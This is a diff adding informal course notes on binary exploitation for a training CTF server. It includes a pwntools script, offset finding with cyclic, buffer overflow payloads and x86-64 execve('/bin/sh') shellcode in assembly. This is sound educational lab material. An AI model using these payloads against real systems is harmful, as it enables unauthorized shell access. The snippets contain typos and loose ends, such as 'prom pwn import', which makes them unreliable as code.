@@ -1,0 +1,107 @@
+obtain permissions on a file: chmod +x ./prog
+
+checksec shellcode to check if NX is disabled or enabled: if it is disabled every part of the program is executable.
+
+
+sol: basic buffer overflow
+	we need a shellcode: 
+
+-----------------
+phtoyn code:
+
+prom pwn import *
+context.terminal = ['tmux','splitw','-h']
+r = remote("training.jinblack.it", 2001)   --> connetting remotely to address and port (the challange in this case)
+r = process("./shellcode")		--> connetting to a local process
+gdb.attach(r, """		--> can attach only after the first read/sleep/.. (so cannot set up a breakpoint before that)
+	b *0x0400709
+	c
+	""")			-->attaches gdb, creates a breakpoint and goes to next instruction
+input("wait")			--> necessary to wait for gdb to attach instead of going on
+
+print(r.recv(1024))		--> receives up to 1024 byte (not recommended)
+print(r.recvuntil("name?\n"))     --> receives up to "name?\n"
+
+stack_address = 0x7fffd1ca32    -->address just after the return address
+
+payload = b"\x90" * 1200 + p64(stack_address) + shellcode    --> p64() translates an address in a string
+								//the 'b' is necessary for python 3 to note that is a byte and note a string
+r.send(payload)			-->sends 1200 A
+
+r.interactive()
+
+----------------------------
+
+python name.py   --> runs name
+
+
+sudo dsmsg shows where crashes
+
+
+cyclic 1200  --> creates a string of 1200 characters
+cyclic -n 8 1200 --> 1200 characters with a pattern of size 8  (generate a big string and copy in the python program)
+cyclic -n 8 -l 0x66616161616163    --> returns the position on the generated string of the pattern
+(update cyclic with the github version(clone repo and pip install))
+
+payload = "A" * 440 + "B" * 8 	--> and check if we found the Bs where wanted
+
+remember: if convert an hexa in string I have to then invert the string to have the correct value cause of little endian
+
+-------------------lesson 3--------------------
+
+write shellcode: online assembler on slides.
+
+
+
+With NX disabled we can put the shellcode not in the stack(harder because randomized) but in a global variable buffer.
+put in phy not stack_address but put the address of the buffer.
+
+buffer = 0x601080
+
+shellcode = b"\xcc" * 10;		//gdb get it as an interrupt just befeore the execution of the shellcode
+
+payload = shellcode.ljust(1016, b"\x90") + p64(buffer)
+
+
+shellcode = we need an execv of /bin/sh with some parameters. The parameters can be got by tables avaible on a link on the slides (linux 64bits architecture actually)
+
+execve -> rax = 0x3b rdi = pointer to /bin/sh rsi = empty array of strings(pointer to null pointer(8 zeroes)) rdx = same as rsi
+
+
+shellcode = b"\xcc" * 200 + b"/bin/sh\x00" + b"\x00"*8
+
+mov rax, 0x3b
+mov rdi, 0x601148             --> buffer + 200
+mov rsi, 0x601150	      --> buffer + 200 + lenght("/bin/sh\x00")=8
+mov rdx, 0x601150
+syscall			
+
+shellcode = b"\x48\x89.......".ljust(200, b"\x90") + b"/bin/sh\x00" + b"\x00"*8
+
+
+
+write a shellcode position indipendent from the position of /bin/sh:
+
+jmp endshellcode
+shellcode:
+pop rdi
+mov rsi, rdi		
+add rsi, 8
+mov rdx, rsi
+mov rax, 0x3b
+syscall
+
+endshellcode:
+call shellcode
+/bin/sh
+
+
+---------------------------Multi stage shellcode-------------------------
+Necessary when there is not enough space for the shellcode in buffer.
+First stage: a read that reads the shellcode in memory. Takes way less space than execve.
+Second stage: execute shellcode.
+
+
+
+
+
